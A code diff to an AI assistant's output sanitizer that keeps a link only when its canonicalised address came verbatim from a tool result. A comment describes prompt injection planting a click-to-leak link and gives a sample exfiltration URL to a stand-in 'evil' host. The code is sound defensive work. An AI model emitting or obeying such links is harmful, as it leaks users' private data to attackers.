@@ -133,7 +133,8 @@ export const MAX_CLEAN_CHARS = 50_000;
 export interface CleanOptions {
   /**
    * In a turn that read untrusted text, an http(s) link is kept only when its address is in
-   * here (it came from a tool result word for word); any other becomes plain text, so injected
+   * here (it came from a tool result word for word; compared by `canonicalUrl`, so give
+   * addresses in that form); any other becomes plain text, so injected
    * prose can't plant a click-to-leak link (`https://evil/?d=<private data>`).
    */
   keepUrls?: ReadonlySet<string>;
@@ -180,7 +181,7 @@ const HREF_MARKUP = /[[\]()`*<>\\"'\s]/;
 function isSafeHref(href: string, opts: CleanOptions): boolean {
   const h = href.trim();
   if (HREF_MARKUP.test(h)) return false;
-  if (/^https?:\/\//i.test(h)) return !opts.keepUrls || opts.keepUrls.has(h);
+  if (/^https?:\/\//i.test(h)) return !opts.keepUrls || opts.keepUrls.has(canonicalUrl(h));
   return h.startsWith("/") && !h.startsWith("//") && !h.includes("\\");
 }
 
@@ -188,10 +189,23 @@ function isSafeHref(href: string, opts: CleanOptions): boolean {
 export function urlsIn(value: unknown, out: Set<string> = new Set(), depth = 0): Set<string> {
   if (depth > 8 || out.size > 500 || value === null || value === undefined) return out;
   if (typeof value === "string") {
-    for (const m of value.slice(0, MAX_CLEAN_CHARS).match(/https?:\/\/[^\s)<>"'\]]{1,2048}/g) ?? []) out.add(m);
+    for (const m of value.slice(0, MAX_CLEAN_CHARS).match(/https?:\/\/[^\s)<>"'\]]{1,2048}/gi) ?? []) out.add(m);
   } else if (Array.isArray(value)) value.slice(0, 500).forEach((v) => urlsIn(v, out, depth + 1));
   else if (typeof value === "object") Object.values(value as Record<string, unknown>).slice(0, 500).forEach((v) => urlsIn(v, out, depth + 1));
   return out;
+}
+
+/**
+ * An http(s) address in one canonical spelling (scheme and host lower-cased, default port and
+ * empty path filled in), so `HTTPS://Evil.com` and `https://evil.com/` compare equal. The
+ * input as it is when it doesn't parse.
+ */
+export function canonicalUrl(url: string): string {
+  try {
+    return new URL(url.trim()).href;
+  } catch {
+    return url.trim();
+  }
 }
 
 /** Without hidden characters: control characters, bidi overrides, zero-width characters. */
